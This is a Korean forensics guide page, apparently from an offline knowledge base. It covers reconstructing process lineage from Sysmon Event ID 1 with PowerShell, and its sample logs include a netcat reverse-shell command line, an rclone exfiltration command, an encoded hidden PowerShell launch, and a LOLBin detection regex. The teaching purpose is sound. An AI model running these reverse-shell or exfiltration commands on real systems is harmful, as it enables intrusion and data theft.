@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Sysmon Event ID 1 ProcessCreate: ProcessGuid로 프로세스 계보 복원 · FOR-0099 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Event%20Log">Event Log</a> / FOR-0099
+      </div>
+      <header class="article-head">
+        <h1>Sysmon Event ID 1 ProcessCreate: ProcessGuid로 프로세스 계보 복원</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Event Log</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-basic">기본</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>Sysmon Event ID 1은 프로세스 생성마다 명령행·해시·부모 명령행·원본 파일명을 남긴다. ProcessGuid로 부모-자식을 이으면 PID 재사용에 흔들리지 않는 완전한 프로세스 계보가 나온다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>Sysmon, EvtxECmd, Event Viewer, PowerShell, Timeline Explorer</td></tr>
+<tr><th>artifact</th><td><code>Sysmon</code> · <code>ProcessCreate</code> · <code>ProcessGuid</code> · <code>OriginalFileName</code> · <code>IMPHASH</code> · <code>ParentCommandLine</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx</code> · <code>C:\Windows\Sysmon64.exe</code></td></tr>
+<tr><th>Event ID</th><td><code>1</code></td></tr>
+<tr><th>regex</th><td><code>MD5=([A-Fa-f0-9]{32})</code> · <code>SHA256=([A-Fa-f0-9]{64})</code> · <code>IMPHASH=([A-Fa-f0-9]{32})</code></td></tr>
+<tr><th>로그 필드</th><td><code>RuleName</code> · <code>UtcTime</code> · <code>ProcessGuid</code> · <code>ProcessId</code> · <code>Image</code> · <code>FileVersion</code> · <code>Description</code> · <code>Product</code> · <code>Company</code> · <code>OriginalFileName</code> · <code>CommandLine</code> · <code>CurrentDirectory</code> · <code>User</code> · <code>LogonGuid</code> · <code>LogonId</code> · <code>TerminalSessionId</code> · <code>IntegrityLevel</code> · <code>Hashes</code> · <code>ParentProcessGuid</code> · <code>ParentProcessId</code> · <code>ParentImage</code> · <code>ParentCommandLine</code> · <code>ParentUser</code></td></tr>
+<tr><th>파일 형식</th><td><code>evtx</code></td></tr>
+<tr><th>검색 별칭</th><td>sysmon 프로세스 생성 · sysmon 1 · sysmon 이벤트 1 · 프로세스 계보 · 부모 프로세스 찾기 · sysmon 명령행 · 이름 위장 탐지</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p>Sysmon Event ID 1은 프로세스 생성마다 <strong>명령행·해시·부모 명령행·원본 파일명</strong>을 남긴다. <code>ProcessGuid</code>로 부모-자식을 이으면 PID 재사용에 흔들리지 않는 완전한 프로세스 계보가 나온다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>&quot;무엇이 이 프로그램을 실행했는가&quot; — <code>ParentImage</code>, <code>ParentCommandLine</code></li><li>&quot;실행 명령의 전체 인자를 구하라&quot; — 4688 명령행 감사가 꺼져 있어도 항상 기록된다</li><li>&quot;이 파일의 해시는 무엇인가&quot; — <code>Hashes</code></li><li>&quot;이름을 바꿔 위장한 실행 파일이 있는가&quot; — <code>OriginalFileName</code> 대조</li><li>&quot;권한 상승이 있었는가&quot; — <code>IntegrityLevel</code></li><li>&quot;원격 세션에서 실행된 프로세스만 보고 싶다&quot; — <code>TerminalSessionId</code></li><li>프로세스 트리(계보) 그리기</li></ul>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li>첨부에 <code>Microsoft-Windows-Sysmon%4Operational.evtx</code>가 있다 → Event 1을 가장 먼저 본다</li><li>지문에 &quot;어떤 프로세스가&quot;, &quot;무엇이 실행했나&quot; → <code>ParentImage</code></li><li>해시가 주어졌다 → <code>Hashes</code>로 바로 필터</li><li>지문에 &quot;명령행 전체&quot;, &quot;인자&quot; → <code>CommandLine</code></li><li>4688은 있는데 명령행이 비어 있다 → Sysmon 1로 갈아탄다</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 원본: Microsoft-Windows-Sysmon%4Operational.evtx -&gt; sysmon.evtx
+Get-WinEvent -Path &#39;C:\case\sysmon.evtx&#39; -FilterXPath &#39;*[System[EventID=1]]&#39; | Format-List</code></pre></div>
+<p>전 필드를 객체로 뽑아 두고 시작한다. 이후 모든 분석이 이 변수 하나로 끝난다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$sm = &#39;C:\case\sysmon.evtx&#39;
+
+$p1 = Get-WinEvent -Path $sm -FilterXPath &#39;*[System[EventID=1]]&#39; |
+  ForEach-Object {
+    $x = [xml]$_.ToXml()
+    $d = @{}
+    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.&#39;#text&#39; }
+    [pscustomobject]@{
+      UtcTime    = $d[&#39;UtcTime&#39;]
+      Image      = $d[&#39;Image&#39;]
+      OrigName   = $d[&#39;OriginalFileName&#39;]
+      CommandLine= $d[&#39;CommandLine&#39;]
+      Cwd        = $d[&#39;CurrentDirectory&#39;]
+      User       = $d[&#39;User&#39;]
+      Integrity  = $d[&#39;IntegrityLevel&#39;]
+      Session    = $d[&#39;TerminalSessionId&#39;]
+      LogonId    = $d[&#39;LogonId&#39;]
+      Guid       = $d[&#39;ProcessGuid&#39;]
+      Pid        = $d[&#39;ProcessId&#39;]
+      PGuid      = $d[&#39;ParentProcessGuid&#39;]
+      PPid       = $d[&#39;ParentProcessId&#39;]
+      PImage     = $d[&#39;ParentImage&#39;]
+      PCmd       = $d[&#39;ParentCommandLine&#39;]
+      Hashes     = $d[&#39;Hashes&#39;]
+      RuleName   = $d[&#39;RuleName&#39;]
+    }
+  } | Sort-Object UtcTime
+
+$p1 | Select-Object -First 20 UtcTime, Image, CommandLine | Format-Table -AutoSize</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-필드-전수표">1단계 — 필드 전수표</h3>
+<div class="table-wrap"><table><thead><tr><th>필드</th><th>의미</th><th>실전 활용</th></tr></thead><tbody><tr><td><code>RuleName</code></td><td>매칭된 설정 규칙 이름</td><td>설정 파일에서 태그를 붙였을 때만 값이 있다</td></tr><tr><td><code>UtcTime</code></td><td><strong>이미 UTC인 이벤트 시각</strong></td><td>변환 없이 그대로 UTC로 읽는다</td></tr><tr><td><code>ProcessGuid</code></td><td>프로세스 전역 고유 ID</td><td><strong>모든 피벗의 기준 키</strong></td></tr><tr><td><code>ProcessId</code></td><td>PID</td><td>재사용된다. 단독으로 쓰지 않는다</td></tr><tr><td><code>Image</code></td><td>실행 파일 전체 경로</td><td>경로 자체가 이상 신호(<code>\Temp\</code>, <code>\AppData\</code>)</td></tr><tr><td><code>FileVersion</code></td><td>파일 버전 리소스</td><td>정품 여부 판단 보조</td></tr><tr><td><code>Description</code></td><td>파일 설명</td><td><code>Windows Command Processor</code> 등</td></tr><tr><td><code>Product</code></td><td>제품명</td><td>위장 파일은 비거나 어긋난다</td></tr><tr><td><code>Company</code></td><td>회사명</td><td><code>Microsoft Corporation</code>이 아니면서 시스템 경로면 의심</td></tr><tr><td><code>OriginalFileName</code></td><td><strong>PE 리소스에 박힌 원본 파일명</strong></td><td>파일명을 바꿔도 남는다. 위장 탐지의 핵심</td></tr><tr><td><code>CommandLine</code></td><td><strong>전체 명령행</strong></td><td>항상 기록된다</td></tr><tr><td><code>CurrentDirectory</code></td><td>실행 시 작업 디렉터리</td><td>공격자의 작업 폴더가 드러난다</td></tr><tr><td><code>User</code></td><td>실행 계정</td><td><code>NT AUTHORITY\SYSTEM</code> 등</td></tr><tr><td><code>LogonGuid</code></td><td>로그온 세션 GUID</td><td>Sysmon 내부 세션 키</td></tr><tr><td><code>LogonId</code></td><td><strong>로그온 세션 ID(16진수)</strong></td><td>Security 4624의 <code>TargetLogonId</code>와 같은 값</td></tr><tr><td><code>TerminalSessionId</code></td><td>터미널 세션 번호</td><td>RDP 세션의 <code>SessionID</code>와 대응</td></tr><tr><td><code>IntegrityLevel</code></td><td>무결성 수준</td><td>권한 상승 판정</td></tr><tr><td><code>Hashes</code></td><td>해시 문자열</td><td><code>MD5=...,SHA256=...,IMPHASH=...</code></td></tr><tr><td><code>ParentProcessGuid</code></td><td>부모의 <code>ProcessGuid</code></td><td><strong>계보 연결 키</strong></td></tr><tr><td><code>ParentProcessId</code></td><td>부모 PID</td><td>참고용</td></tr><tr><td><code>ParentImage</code></td><td>부모 실행 파일 경로</td><td>&quot;무엇이 실행했나&quot;의 답</td></tr><tr><td><code>ParentCommandLine</code></td><td><strong>부모의 전체 명령행</strong></td><td>4688에는 없는 값</td></tr><tr><td><code>ParentUser</code></td><td>부모의 실행 계정</td><td>신버전에서 추가된 필드. 없을 수 있다</td></tr></tbody></table></div>
+<h3 id="2단계-4688-대비-압도적인-이유">2단계 — 4688 대비 압도적인 이유</h3>
+<div class="table-wrap"><table><thead><tr><th>항목</th><th>Security 4688</th><th>Sysmon 1</th></tr></thead><tbody><tr><td>명령행</td><td><strong>감사 정책을 별도로 켜야 기록</strong>(기본 꺼짐)</td><td>항상 기록</td></tr><tr><td>부모 프로세스</td><td><code>ParentProcessName</code>(경로만)</td><td><code>ParentImage</code> + <strong><code>ParentCommandLine</code></strong></td></tr><tr><td>해시</td><td>없음</td><td><strong>MD5/SHA256/IMPHASH</strong></td></tr><tr><td>원본 파일명</td><td>없음</td><td><strong><code>OriginalFileName</code></strong></td></tr><tr><td>PID 재사용</td><td>구분 불가</td><td><strong><code>ProcessGuid</code>로 완전 구분</strong></td></tr><tr><td>작업 디렉터리</td><td>없음</td><td><code>CurrentDirectory</code></td></tr><tr><td>무결성 수준</td><td><code>MandatoryLabel</code>(SID 형태)</td><td><code>IntegrityLevel</code>(문자열)</td></tr><tr><td>세션</td><td><code>SubjectLogonId</code></td><td><code>LogonId</code> + <code>TerminalSessionId</code></td></tr><tr><td>시각</td><td>EVTX <code>SystemTime</code>(UTC)</td><td><code>UtcTime</code> 필드 + <code>SystemTime</code></td></tr><tr><td>설치 필요</td><td>불필요(OS 내장)</td><td><strong>Sysmon이 설치돼 있어야 한다</strong></td></tr></tbody></table></div>
+<p><strong>Sysmon이 설치돼 있으면 4688을 볼 이유가 거의 없다.</strong> 반대로 Sysmon이 없으면 4688밖에 없다. 두 로그가 다 있으면 Sysmon 1을 기준으로 삼고 4688은 누락 구간 보완에만 쓴다.</p>
+<h3 id="3단계-processguid로-계보-복원">3단계 — ProcessGuid로 계보 복원</h3>
+<p>PID는 프로세스가 죽으면 재사용된다. 장시간 로그에서 <code>ProcessId = 4728</code>이 세 개의 서로 다른 프로세스일 수 있다. <code>ProcessGuid</code>는 그 문제가 없다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># GUID -&gt; 프로세스 인덱스
+$byGuid = @{}
+foreach ($e in $p1) { $byGuid[$e.Guid] = $e }
+
+# 관심 프로세스에서 조상 방향으로 거슬러 올라간다
+function Get-Ancestry($guid) {
+  $cur = $byGuid[$guid]
+  while ($cur) {
+    &quot;{0}  {1}  {2}&quot; -f $cur.UtcTime, $cur.Image, $cur.CommandLine
+    $cur = $byGuid[$cur.PGuid]
+  }
+}
+
+Get-Ancestry &#39;{a1b2c3d4-1f30-6610-3c00-000000000a00}&#39;</code></pre></div>
+<p>출력:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">2026-03-14 07:24:55.412  C:\Users\svc_backup\Downloads\rclone.exe  rclone.exe copy C:\data remote:bk
+2026-03-14 07:20:08.104  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  powershell.exe -nop -w hidden -enc SQBFAFgA...
+2026-03-14 07:19:31.887  C:\Windows\System32\cmd.exe  cmd.exe /c &quot;&quot;
+2026-03-14 07:18:46.220  C:\Windows\System32\winlogon.exe  winlogon.exe</code></pre></div>
+<p>자식 방향으로 펼치는 형태:</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$children = $p1 | Group-Object PGuid -AsHashTable -AsString
+
+function Show-Tree($guid, $depth = 0) {
+  $e = $byGuid[$guid]
+  if ($e) { &quot;{0}{1}  {2}&quot; -f (&#39; &#39; * ($depth * 2)), $e.Image, $e.CommandLine }
+  foreach ($c in $children[$guid]) { Show-Tree $c.Guid ($depth + 1) }
+}
+
+Show-Tree &#39;{a1b2c3d4-1f2a-6610-3800-000000000a00}&#39;</code></pre></div>
+<p><code>ProcessGuid</code>는 머신 식별자와 프로세스 시작 시각 계열 값이 조합된 형태이므로 같은 호스트 안에서 사실상 유일하다. <strong>여러 호스트의 로그를 합칠 때도 GUID가 섞이지 않는다.</strong></p>
+<h3 id="4단계-originalfilename으로-이름-위장-확정">4단계 — OriginalFileName으로 이름 위장 확정</h3>
+<p>PE 파일의 버전 리소스에는 컴파일 시점의 원본 파일명이 박혀 있다. 파일을 <code>svchost.exe</code>로 복사해도 이 값은 바뀌지 않는다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$p1 | Where-Object {
+  $_.OrigName -and
+  ([IO.Path]::GetFileName($_.Image) -ne $_.OrigName)
+} | Select-Object UtcTime, Image, OrigName, CommandLine | Format-Table -AutoSize</code></pre></div>
+<p>출력:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">UtcTime                  Image                                  OrigName        CommandLine
+-------                  -----                                  --------        -----------
+2026-03-14 07:22:03.551  C:\Windows\Temp\svchost.exe            nc.exe          svchost.exe -e cmd 45.146.164.9 4444
+2026-03-14 07:31:18.902  C:\Users\Public\update.exe             PsExec.exe      update.exe \\WS03 -s cmd
+2026-03-14 09:14:40.117  C:\Windows\System32\rundll32.exe       RUNDLL.EXE      rundll32.exe shell32.dll,#61</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>결과</th><th>판정</th></tr></thead><tbody><tr><td><code>Image</code> 파일명 ≠ <code>OriginalFileName</code></td><td><strong>이름 위장 확정.</strong> 원래 도구가 무엇인지도 드러난다</td></tr><tr><td><code>OriginalFileName</code>이 빈 값</td><td>버전 리소스가 없는 파일. 직접 컴파일한 바이너리나 패킹된 파일</td></tr><tr><td>둘이 같지만 경로가 비정상</td><td>정품 바이너리를 다른 경로에 복사(LOLBin 남용)</td></tr><tr><td>세 번째 줄처럼 대소문자만 다름</td><td>정상. Microsoft 바이너리에 흔한 표기 차이이므로 오탐</td></tr></tbody></table></div>
+<p>세 번째 줄이 오탐 예다. 필터에 대소문자 무시 비교를 넣지 않으면 정상 파일이 대량으로 걸린다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$p1 | Where-Object {
+  $_.OrigName -and
+  ([IO.Path]::GetFileName($_.Image).ToLower() -ne $_.OrigName.ToLower())
+} | Select-Object UtcTime, Image, OrigName</code></pre></div>
+<h3 id="5단계-integritylevel로-권한-상승-탐지">5단계 — IntegrityLevel로 권한 상승 탐지</h3>
+<div class="table-wrap"><table><thead><tr><th>값</th><th>의미</th><th>신호</th></tr></thead><tbody><tr><td><code>Untrusted</code></td><td>최하위</td><td>샌드박스</td></tr><tr><td><code>Low</code></td><td>낮음</td><td>브라우저 렌더러, 보호 모드</td></tr><tr><td><code>Medium</code></td><td>일반 사용자</td><td>기본값</td></tr><tr><td><code>High</code></td><td>관리자 권한(승격됨)</td><td><strong>UAC 승격 성공</strong></td></tr><tr><td><code>System</code></td><td>시스템 권한</td><td>서비스/커널 근접</td></tr><tr><td><code>AppContainer</code></td><td>앱 컨테이너</td><td>스토어 앱</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># Medium 부모 -&gt; High/System 자식 = 권한 상승 순간
+$p1 | Where-Object { $_.Integrity -in &#39;High&#39;,&#39;System&#39; } |
+  Select-Object UtcTime, Image, Integrity, User, PImage | Format-Table -AutoSize</code></pre></div>
+<p>같은 사용자 세션에서 <code>Medium</code>으로 돌던 프로세스가 <code>High</code> 자식을 만들면 UAC 승격이 있었다는 뜻이다. 4672(특수 권한 로그온)와 시각을 맞춰 확증한다.</p>
+<h3 id="6단계-실전-필터">6단계 — 실전 필터</h3>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># LOLBin 및 스크립트 호스트
+$lol = &#39;powershell|pwsh|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|&#39; +
+       &#39;msiexec|installutil|regasm|regsvcs|msbuild|wmic|schtasks|at\.exe|sc\.exe|net\.exe|&#39; +
+       &#39;psexec|winrs|curl|wget|ftp\.exe&#39;
+
+$p1 | Where-Object { $_.Image -match $lol -or $_.CommandLine -match $lol } |
+  Select-Object UtcTime, Image, CommandLine, PImage | Format-Table -AutoSize
+
+# 비정상 부모-자식 조합
+$p1 | Where-Object {
+  ($_.PImage -match &#39;winword|excel|powerpnt|outlook|acrord32&#39; -and
+   $_.Image -match &#39;powershell|cmd\.exe|wscript|mshta|rundll32&#39;) -or
+  ($_.PImage -match &#39;w3wp|httpd|nginx|sqlservr&#39; -and $_.Image -match &#39;cmd\.exe|powershell&#39;)
+} | Select-Object UtcTime, PImage, Image, CommandLine | Format-Table -AutoSize
+
+# 사용자 쓰기 가능 경로에서 실행
+$p1 | Where-Object { $_.Image -match &#39;\\Temp\\|\\AppData\\|\\Downloads\\|\\Public\\|\\ProgramData\\&#39; } |
+  Select-Object UtcTime, Image, User, Hashes | Format-Table -AutoSize</code></pre></div>
+<p><code>winword.exe → powershell.exe</code>는 문서 매크로 실행의 전형이고, <code>w3wp.exe → cmd.exe</code>는 웹셸의 전형이다.</p>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
+<p><code>UtcTime</code>은 <strong>이미 UTC</strong>다. Sysmon이 이 필드를 UTC로 기록하므로 변환하지 않는다. 반면 Event Viewer가 위에 보여 주는 시각은 EVTX <code>SystemTime</code>(UTC)을 <strong>로컬 시간대로 변환한 값</strong>이다. 그래서 같은 이벤트에서 두 시각이 다르게 보인다.</p>
+<div class="table-wrap"><table><thead><tr><th>무엇을 볼 때</th><th>기준</th></tr></thead><tbody><tr><td><code>UtcTime</code> 필드</td><td>UTC. 그대로 사용</td></tr><tr><td>EVTX <code>SystemTime</code></td><td>UTC로 저장</td></tr><tr><td>Event Viewer 상단 시각</td><td>조회 PC의 로컬 시간대로 변환됨</td></tr><tr><td>EvtxECmd CSV</td><td>UTC로 출력</td></tr><tr><td>KST 답</td><td>UTC + 9시간</td></tr></tbody></table></div>
+<p>이미지의 시간대 설정은 SYSTEM hive의 <code>TimeZoneInformation</code>으로 확정한다(<a href="./system-timezone.html">FOR-0054</a>).</p>
+<p><code>Hashes</code>는 설정에 따라 구성이 달라진다.</p>
+<div class="table-wrap"><table><thead><tr><th>형태</th><th>의미</th></tr></thead><tbody><tr><td><code>SHA1=...</code></td><td>Sysmon 기본 알고리즘</td></tr><tr><td><code>MD5=...,SHA256=...</code></td><td>설정에서 지정</td></tr><tr><td><code>IMPHASH=...</code></td><td>PE 임포트 테이블 해시. <strong>컴파일 시 재사용되므로 변종 묶기에 강하다</strong></td></tr></tbody></table></div>
+<p>IMPHASH는 문자열만 바꾼 변종끼리 같은 값이 나오므로, 이름과 SHA256이 다른 파일이 같은 도구인지 판정할 때 쓴다.</p>
+<h2 id="pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</h2>
+<div class="table-wrap"><table><thead><tr><th>여기서 얻은 값</th><th>다음에 볼 것</th><th>확인할 내용</th></tr></thead><tbody><tr><td><code>ProcessGuid</code></td><td>Sysmon 3 (NetworkConnect)</td><td>그 프로세스의 외부 통신</td></tr><tr><td><code>ProcessGuid</code></td><td>Sysmon 11 (FileCreate)</td><td>그 프로세스가 만든 파일</td></tr><tr><td><code>ProcessGuid</code></td><td>Sysmon 13 (RegistryEvent)</td><td>그 프로세스의 지속성 등록</td></tr><tr><td><code>ProcessGuid</code></td><td>Sysmon 5 (ProcessTerminate)</td><td>종료 시각 → 실행 지속시간</td></tr><tr><td><code>LogonId</code></td><td>4624 <code>TargetLogonId</code> (<a href="./event-4624-logon.html">FOR-0083</a>)</td><td>어느 로그온 세션·접속 IP인가</td></tr><tr><td><code>TerminalSessionId</code></td><td>RDP LocalSessionManager <code>SessionID</code></td><td>원격 세션에서 실행됐는가</td></tr><tr><td><code>Hashes</code></td><td>VirusTotal·YARA·해시 목록</td><td>알려진 악성 도구 여부</td></tr><tr><td><code>Image</code> 경로</td><td><code>$MFT</code> (<a href="./mft-basics.html">FOR-0021</a>)</td><td>그 파일의 생성 시각과 삭제 여부</td></tr><tr><td><code>OriginalFileName</code></td><td>확장자·시그니처 대조 (<a href="./signature-extension-mismatch.html">FOR-0036</a>)</td><td>위장 수법 확정</td></tr><tr><td><code>CommandLine</code>의 base64</td><td>PowerShell 4104</td><td>디코딩된 스크립트 본문</td></tr><tr><td><code>CurrentDirectory</code></td><td>그 폴더의 파일 목록</td><td>공격자 작업 폴더 전체</td></tr></tbody></table></div>
+<h2 id="흔한-함정">흔한 함정</h2>
+<ul><li><strong>PID로 부모-자식을 잇는 것.</strong> PID는 재사용된다 → 장시간 로그에서 엉뚱한 부모가 붙는다 → <code>ProcessGuid</code>/<code>ParentProcessGuid</code>로 잇는다.</li><li><strong><code>UtcTime</code>을 로컬 시각으로 오해해 9시간을 또 더하는 것.</strong> 이미 UTC다 → 이중 변환하면 답이 9시간 틀어진다.</li><li><strong>Event Viewer 상단 시각과 <code>UtcTime</code>이 달라서 로그가 손상됐다고 보는 것.</strong> 표시 시각만 로컬로 변환된 것이다 → 항상 <code>UtcTime</code>을 기준으로 타임라인을 만든다.</li><li><strong><code>OriginalFileName</code> 비교에서 대소문자를 구분하는 것.</strong> <code>RUNDLL.EXE</code> vs <code>rundll32.exe</code> 같은 정상 차이로 오탐이 쏟아진다 → 소문자로 정규화한 뒤 비교하고, 정품 Microsoft 바이너리는 별도로 다룬다.</li><li><strong>Sysmon 1이 전부라고 믿는 것.</strong> Sysmon은 설정 파일로 필터링되며, 제외 규칙에 걸린 프로세스는 아예 기록되지 않는다 → <code>sysmon64.exe -c</code>로 설정을 확인하거나 4688과 대조해 누락 구간을 찾는다.</li><li><strong><code>Hashes</code>가 없어서 로그가 잘못됐다고 보는 것.</strong> 해시 알고리즘은 설정 항목이다 → 없으면 파일 자체를 이미지에서 추출해 직접 해시한다.</li><li><strong><code>IntegrityLevel = System</code>을 무조건 악성으로 보는 것.</strong> 정상 서비스가 대부분이다 → 부모가 사용자 프로세스인 <code>System</code> 자식만 남긴다.</li><li><strong><code>ParentImage</code>만 보고 부모 명령행을 안 보는 것.</strong> <code>powershell.exe</code>가 부모라도 그 명령행이 진짜 단서다 → <code>ParentCommandLine</code>을 반드시 함께 읽는다.</li><li><strong>Sysmon 설치 시점 이전을 조사하려는 것.</strong> 설치 전 활동은 로그에 없다 → Sysmon 서비스 설치 시각(7045, <code>$MFT</code>의 <code>Sysmon64.exe</code> 생성 시각)을 먼저 확인해 조사 가능 구간을 정한다.</li><li><strong><code>RuleName</code>이 비어 있다고 이상하게 보는 것.</strong> 설정에서 태그를 지정하지 않으면 빈 값이다 → 판정에 쓰지 않는다.</li></ul>
+<h2 id="교차검증">교차검증</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$sm  = &#39;C:\case\sysmon.evtx&#39;
+$sec = &#39;C:\case\Security.evtx&#39;
+
+# 1) Sysmon 1 총 건수와 기록 구간 (조사 가능 범위 확정)
+$p1.Count
+$p1[0].UtcTime; $p1[-1].UtcTime
+
+# 2) 같은 프로세스가 4688 에도 있는지 (누락 구간 판정)
+Get-WinEvent -FilterHashtable @{Path=$sec; Id=4688} |
+  Where-Object { $_.Message -match &#39;rclone&#39; } | Select-Object TimeCreated
+
+# 3) 그 프로세스의 네트워크 연결 (Sysmon 3)
+Get-WinEvent -Path $sm -FilterXPath &#39;*[System[EventID=3]]&#39; |
+  Where-Object { $_.Message -match &#39;rclone&#39; } | Select-Object -First 5 TimeCreated, Message
+
+# 4) 로그온 세션 연결 (LogonId -&gt; 4624)
+Get-WinEvent -FilterHashtable @{Path=$sec; Id=4624} |
+  Where-Object { $_.Message -match &#39;0x1a2b3c&#39; }
+
+# 5) Sysmon 서비스 설치 시각 (조사 가능 구간의 시작)
+Get-WinEvent -FilterHashtable @{Path=&#39;C:\case\System.evtx&#39;; Id=7045} |
+  Where-Object { $_.Message -match &#39;Sysmon&#39; }</code></pre></div>
+<p>Sysmon 1과 4688이 둘 다 있으면 건수를 비교한다. Sysmon 쪽이 적으면 설정에서 제외된 것이고, 4688 쪽이 적으면 감사 정책이 중간에 켜진 것이다.</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;C:\Windows\Temp\svchost.exe 를 실행시킨 최초 원인(문서/스크립트)을 밝히시오.
+ 첨부: Microsoft-Windows-Sysmon%4Operational.evtx&quot;
+
+1. 첫 시도 (실패):
+   Event 1 에서 Image 가 svchost.exe 인 것을 찾고 ParentProcessId 로 부모를 찾았다.
+
+     UtcTime 2026-03-14 07:22:03.551
+     Image   C:\Windows\Temp\svchost.exe
+     ProcessId 4728   ParentProcessId 3140
+
+   ProcessId=3140 인 Event 1 을 검색 -&gt; 두 건이 나왔다.
+     06:02:11  C:\Program Files\...\OneDrive.exe        (ProcessId 3140)
+     07:20:08  C:\Windows\...\powershell.exe            (ProcessId 3140)
+
+   앞선 것을 부모로 골라 &quot;OneDrive 가 실행했다&quot; 고 답했다. 오답.
+
+   왜 틀렸나:
+   PID 3140 은 재사용된 번호다. PID 만으로는 어느 쪽이 진짜 부모인지 알 수 없다.
+
+2. 피벗 — ParentProcessGuid 를 썼다.
+   svchost.exe 의 ParentProcessGuid = {a1b2c3d4-1f2a-6610-3800-000000000a00}
+   그 GUID 를 ProcessGuid 로 갖는 이벤트는 단 하나다.
+
+     07:20:08.104  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                   powershell.exe -nop -w hidden -enc SQBFAFgA...
+   -&gt; 진짜 부모는 powershell.exe 였다.
+
+3. 계보를 계속 거슬러 올라갔다.
+   07:20:08  powershell.exe -nop -w hidden -enc ...
+     ParentProcessGuid -&gt; 07:19:58  C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+                                     &quot;WINWORD.EXE&quot; /n &quot;C:\Users\jhkim\Downloads\invoice.doc&quot;
+       ParentProcessGuid -&gt; 07:19:55  C:\Windows\explorer.exe
+
+   -&gt; 최초 원인은 invoice.doc 매크로다.
+
+4. 위장 확인:
+   svchost.exe 의 OriginalFileName = nc.exe
+   Image 파일명(svchost.exe) != OriginalFileName(nc.exe) -&gt; 이름 위장 확정.
+   CommandLine: svchost.exe -e cmd 45.146.164.9 4444  -&gt; 리버스 셸.
+
+5. 권한 확인:
+   IntegrityLevel = Medium, User = WIN10\jhkim
+   -&gt; 승격 없이 사용자 권한으로 실행됐다.
+
+6. 시간대:
+   UtcTime 은 이미 UTC. 07:19:55 UTC = 16:19:55 KST (+9h)
+   Event Viewer 화면의 16:19:55 를 UTC 로 답하지 않도록 주의.
+
+정답: C:\Users\jhkim\Downloads\invoice.doc (WINWORD.EXE 매크로) -&gt; powershell.exe -&gt; svchost.exe(실체 nc.exe)</code></pre></div>
+<p>1단계의 오답이 <code>ProcessGuid</code>가 존재하는 이유 그 자체다. <strong>PID로 부모를 찾으면 재사용된 번호에 속는다.</strong></p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
